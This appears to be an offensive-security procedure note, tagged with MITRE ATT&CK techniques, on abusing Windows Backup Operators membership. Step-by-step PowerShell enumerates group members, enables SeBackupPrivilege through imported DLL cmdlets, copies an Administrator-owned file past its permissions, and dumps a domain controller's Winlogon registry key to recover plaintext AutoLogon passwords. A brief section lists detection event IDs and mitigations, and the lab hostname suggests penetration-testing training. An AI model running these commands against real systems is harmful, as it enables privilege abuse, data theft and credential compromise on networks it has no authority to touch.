---
id: ae75fbfc-ca21-443a-a6e6-003207ded8e7
name: Abusing-Backup-Operators-Group-for-Sensitive-File-Access
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:06.546586+00:00'
updated_at: '2023-04-10T20:26:17.809931+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Impact|TA0040 - Impact]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Access Token Manipulation|T1134 - Access Token Manipulation]]'
  - '[[techniques/Inhibit System Recovery|T1490 - Inhibit System Recovery]]'
sub_techniques: []
tags:
  - '[[tags/Abusing Backup Operators Group]]'
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Active Directory Groups]]'
commands:
  - '[[commands/check-sebackupprivilege-status]]'
  - '[[commands/copy-file-using-sebackupprivilege]]'
  - '[[commands/enable-sebackupprivilege]]'
  - '[[commands/read-remote-winlogon-registry-key]]'
platforms:
  - Windows
tools: []
validated: true
---

# Abusing-Backup-Operators-Group-for-Sensitive-File-Access

## Summary

Abusing the Backup Operators group allows attackers with membership in this privileged group to bypass standard file permissions and access sensitive files on Windows systems. This procedure details how to enumerate group members, enable the SeBackupPrivilege for the current process, copy restricted files to accessible locations, and extract sensitive registry information such as AutoLogon credentials, enabling data theft and privilege escalation in Active Directory environments.

## Description

The Backup Operators group on Windows grants the SeBackupPrivilege, which permits reading any file on the local or remote system regardless of ACLs, as well as backing up files and directories. Attackers often gain this access through initial compromise of a low-privilege account and subsequent addition to the group via administrative rights or exploitation. Once in the group, the privilege can be enabled to perform actions like dumping sensitive files (e.g., flags, credentials) or querying registry hives for AutoLogon passwords stored in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon. This technique evades file-based defenses and supports further persistence or lateral movement. It is commonly used in domain environments targeting domain controllers or workstations with elevated configurations.

## Requirements

1. Local or remote access to a Windows system via PowerShell (e.g., via WinRM or interactive shell).
2. Current user account must be a member of the Backup Operators group or have equivalent privileges.
3. PowerView module loaded for group enumeration (part of PowerSploit suite).
4. Custom modules like SeBackupPrivilegeUtils.dll and SeBackupPrivilegeCmdLets.dll for privilege manipulation (available from security research repositories).
5. Administrative access on the target for registry queries if reading remotely.

## Defense

Defensive measures and detection strategies:

- Restrict membership in the Backup Operators group to only necessary service accounts and monitor additions/removals via Event ID 4728/4732 in Security logs.
- Enable advanced auditing for file access (Event ID 4663) and privilege use (Event ID 4672/4673) to detect SeBackupPrivilege enabling and anomalous file reads.
- Implement Least Privilege by removing unnecessary Backup Operators memberships and using AppLocker or WDAC to restrict PowerShell execution.
- Monitor for PowerShell imports of unsigned modules and network connections indicative of remote registry access (e.g., via port 445/SMB).

## Objectives

1. Enumerate Backup Operators group membership to confirm access and identify other compromised accounts.
2. Enable SeBackupPrivilege to bypass file permissions for reading sensitive data.
3. Copy restricted files to accessible locations for exfiltration.
4. Extract AutoLogon credentials from remote registry to enable persistence or lateral movement.
5. Achieve unauthorized access to otherwise protected system resources for data theft or escalation.

## Instructions

### Step 1: Enumerate Backup Operators Group Members

**Context**: Begin by verifying membership in the Backup Operators group, including nested groups, to confirm the necessary privileges are available. This step uses PowerView to recursively list members, helping identify if the current session has the required access.

**Command** ([[commands/enumerate-backup-operators-members]]):
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

> This PowerShell command from the PowerView module queries Active Directory for all members of the Backup Operators group, recursing through nested groups. It reveals user accounts with backup privileges, which is crucial for confirming exploitability. Expected output includes a list of users, SIDs, and group types; success is indicated if the current user appears in the results.

### Step 2: Enable SeBackupPrivilege

**Context**: If membership is confirmed, enable the SeBackupPrivilege for the current process to allow bypassing file ACLs. This requires importing custom DLL modules that provide the necessary cmdlets.

**Code** ([[codes/enable-sebackupprivilege-powershell]]):
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
```

> Import the required modules first, then use Set-SeBackupPrivilege to activate the backup right. This modifies the process token to include SeBackupPrivilege, enabling file operations that ignore permissions. Follow up by verifying with Get-SeBackupPrivilege to ensure it is enabled (output should show 'Enabled').

**Command** ([[commands/enable-sebackupprivilege]]):
```powershell
Set-SeBackupPrivilege
```

> Activates the privilege after module import; expected output is confirmation of enablement.

**Command** ([[commands/check-sebackupprivilege-status]]):
```powershell
Get-SeBackupPrivilege
```

> Verifies the privilege status post-enablement; success shows 'Enabled' without errors.

### Step 3: Copy Sensitive File Using SeBackupPrivilege

**Context**: With the privilege enabled, copy a protected file (e.g., a flag or credential file) from a restricted location to a public directory for easy access and exfiltration. This bypasses NTFS permissions.

**Command** ([[commands/copy-file-using-sebackupprivilege]]):
```powershell
Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
```

> The Copy-FileSeBackupPrivilege cmdlet, provided by the imported modules, copies the source file to the destination while leveraging SeBackupPrivilege. Replace paths as needed; the -Overwrite flag ensures existing files are replaced. Expected output is a success message or the copied file appearing in the destination; verify by checking file contents in the public folder.

### Step 4: Read Remote Winlogon Registry Key

**Context**: Extract sensitive AutoLogon configuration from the remote system's registry, which may contain plaintext passwords. This targets domain controllers or workstations with AutoLogon enabled.

**Code** ([[codes/read-remote-winlogon-registry-script]]):
```powershell
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)
$winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
$winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
```

> This PowerShell script opens a remote registry hive on the target machine (replace 'dc.htb.local' with the actual hostname), navigates to the Winlogon subkey, and dumps all value names and data. It uses RegistryView.Registry64 for 64-bit compatibility. Expected output lists keys like DefaultUserName, DefaultPassword, and AutoAdminLogon; success is extracting credential values for further use.

**Command** ([[commands/read-remote-winlogon-registry-key]]):
```powershell
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)
$winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
$winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
```

> Executes the registry query; output displays key-value pairs, including potential passwords if AutoLogon is configured.
